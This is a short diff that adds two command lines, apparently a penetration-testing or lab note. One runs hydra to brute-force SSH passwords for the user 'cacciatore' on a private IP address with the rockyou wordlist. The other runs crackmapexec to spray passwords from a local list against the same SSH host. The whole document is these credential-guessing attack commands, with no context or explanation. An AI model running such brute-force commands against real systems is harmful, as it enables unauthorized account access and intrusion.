@@ -1,1 +1,5 @@
 
+hydra -l cacciatore -P /usr/share/wordlists/rockyou.txt ssh://172.25.120.125 -t 4 
+
+
+crackmapexec ssh 172.25.120.125 -u cacciatore -p /home/beta/ec/binaries/Passwords.txt
